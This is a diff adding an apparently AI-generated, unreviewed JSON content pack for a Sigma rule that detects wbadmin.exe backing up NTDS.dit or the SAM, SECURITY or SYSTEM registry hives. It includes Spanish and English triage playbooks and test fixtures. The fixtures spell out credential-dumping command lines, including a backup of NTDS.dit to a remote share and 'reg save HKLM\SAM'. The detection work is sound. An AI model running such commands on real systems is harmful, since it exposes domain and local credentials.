@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "8b93a509-1cb8-42e1-97aa-ee24224cdc15",
+    "title": "Sensitive File Dump Via Wbadmin.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
+    "path": "windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1003.003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó wbadmin.exe con un CommandLine de backup que incluye NTDS.dit o las colmenas SAM, SECURITY o SYSTEM. Esto puede indicar una extracción de credenciales disfrazada de respaldo.",
+      "what_it_detects": "Creación del proceso wbadmin.exe (por Image u OriginalFileName) con 'start' o 'backup' en CommandLine y una ruta sensible: \\config\\SAM, \\config\\SECURITY, \\config\\SYSTEM o \\Windows\\NTDS\\NTDS.dit.",
+      "why_it_matters": "Con NTDS.dit y la colmena SYSTEM, un atacante puede extraer offline los hashes de todas las cuentas del dominio (ATT&CK T1003.003, NTDS). Con SAM y SECURITY obtiene credenciales locales y secretos LSA. Wbadmin es un binario firmado de Windows (LOLBAS), así que suele pasar desapercibido.",
+      "triage_steps": [
+        "Revise el CommandLine completo: los archivos de -include, el destino de -backupTarget (disco local, recurso UNC o IP externa) y si usa -quiet.",
+        "Identifique al usuario y el host. Confirme si se trata de un controlador de dominio y si la cuenta pertenece al equipo de respaldos autorizado.",
+        "Examine ParentImage y la cadena de procesos padre. Considere sospechoso que lo lance cmd, powershell, wmiprvse, psexesvc o una shell remota.",
+        "Correlacione con tickets de cambio o ventanas de respaldo programadas y confirme con el administrador responsable.",
+        "En el mismo host, entre -15 y +15 minutos, busque vssadmin, ntdsutil, reg save, diskshadow, wbadmin start recovery o accesos a archivos .vhdx.",
+        "Verifique si hubo conexiones SMB salientes o escrituras hacia el destino del backup, y si luego se copiaron o comprimieron archivos desde ese destino.",
+        "Busque alertas previas del mismo usuario, host o IP de origen, como inicios de sesión anómalos o movimiento lateral."
+      ],
+      "false_positives": [
+        "Respaldo legítimo de estado del sistema o de archivos críticos realizado por administradores autorizados. Valide cada caso y cree una excepción específica.",
+        "Scripts o tareas programadas de respaldo documentados que incluyen las colmenas del registro de forma explícita."
+      ],
+      "response_steps": [
+        "Confirme con el responsable si la ejecución fue autorizada. Si no lo fue, escale de inmediato como incidente de credenciales.",
+        "Aísle el host y bloquee o asegure el destino del backup. Preserve el archivo resultante como evidencia antes de borrarlo.",
+        "Deshabilite o restablezca la cuenta usada e investigue cómo obtuvo privilegios de Backup Operators o de administrador.",
+        "Si se comprometió NTDS.dit, planifique el doble restablecimiento de krbtgt y el cambio de contraseñas de cuentas privilegiadas y de servicio.",
+        "Revise la persistencia y el movimiento lateral desde el host y desde la cuenta antes de devolver los sistemas a producción."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque respaldar NTDS.dit o las colmenas SAM/SECURITY/SYSTEM entrega material para comprometer credenciales, y es raro fuera de los respaldos planificados."
+    },
+    "en": {
+      "summary": "wbadmin.exe ran a backup command line that includes NTDS.dit or the SAM, SECURITY or SYSTEM hive. This may be credential theft disguised as a backup.",
+      "what_it_detects": "Process creation of wbadmin.exe (matched by Image or OriginalFileName) whose CommandLine contains 'start' or 'backup' plus a sensitive path: \\config\\SAM, \\config\\SECURITY, \\config\\SYSTEM or \\Windows\\NTDS\\NTDS.dit.",
+      "why_it_matters": "NTDS.dit plus the SYSTEM hive let an attacker extract every domain account hash offline (ATT&CK T1003.003, NTDS). SAM and SECURITY expose local credentials and LSA secrets. Wbadmin is a signed Windows binary (LOLBAS), so this often blends in.",
+      "triage_steps": [
+        "Read the full CommandLine: the -include files, the -backupTarget destination (local disk, UNC share or external IP) and whether -quiet is used.",
+        "Identify the user and host. Check whether it is a domain controller and whether the account belongs to the authorized backup team.",
+        "Inspect ParentImage and the process ancestry. Treat cmd, powershell, wmiprvse, psexesvc or a remote shell as suspicious parents.",
+        "Correlate with change tickets or scheduled backup windows, and confirm with the responsible administrator.",
+        "On the same host within +/- 15 minutes, look for vssadmin, ntdsutil, reg save, diskshadow, wbadmin start recovery or access to .vhdx files.",
+        "Check for outbound SMB connections or writes to the backup target, and for later copying or archiving of files from that target.",
+        "Search for earlier alerts on the same user, host or source IP, such as anomalous logons or lateral movement."
+      ],
+      "false_positives": [
+        "Legitimate system-state or critical-file backups run by authorized administrators. Validate each case and add a narrowly scoped exception.",
+        "Documented backup scripts or scheduled tasks that include the registry hives explicitly."
+      ],
+      "response_steps": [
+        "Confirm authorization with the owner. If the run was unauthorized, escalate immediately as a credential-compromise incident.",
+        "Isolate the host and block or secure the backup target. Preserve the backup file as evidence before deleting it.",
+        "Disable or reset the account used, and find out how it gained Backup Operators or admin rights.",
+        "If NTDS.dit was exposed, plan a double krbtgt reset and rotate the passwords of privileged and service accounts.",
+        "Check the host and account for persistence and lateral movement before returning systems to service."
+      ],
+      "severity_rationale": "High fits because backing up NTDS.dit or the SAM/SECURITY/SYSTEM hives yields material for credential compromise, and it is uncommon outside planned backups."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "wbadmin backs up NTDS.dit and the SYSTEM hive on a domain controller to a remote share",
+        "event": {
+          "EventID": 1,
+          "Computer": "DC-01.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\wbadmin.exe",
+          "OriginalFileName": "WBADMIN.EXE",
+          "CommandLine": "wbadmin start backup -backupTarget:\\\\198.51.100.20\\share -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat"
+        }
+      },
+      {
+        "description": "Renamed wbadmin binary (matched by OriginalFileName) backs up the SAM and SECURITY hives",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\Public\\wb.exe",
+          "OriginalFileName": "WBADMIN.EXE",
+          "CommandLine": "C:\\Users\\Public\\wb.exe start backup -backupTarget:E: -include:C:\\Windows\\System32\\config\\SAM,C:\\Windows\\System32\\config\\SECURITY -quiet",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Routine wbadmin backup of a data folder with no sensitive path",
+        "event": {
+          "EventID": 1,
+          "Computer": "FS-02.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\wbadmin.exe",
+          "OriginalFileName": "WBADMIN.EXE",
+          "CommandLine": "wbadmin start backup -backupTarget:E: -include:D:\\Shares\\Finance -quiet",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+        }
+      },
+      {
+        "description": "reg.exe saves the SAM hive: a sensitive path, but the image is not wbadmin",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\reg.exe",
+          "OriginalFileName": "reg.exe",
+          "CommandLine": "reg save HKLM\\SAM C:\\Windows\\System32\\config\\SAM.bak",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:57:07+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
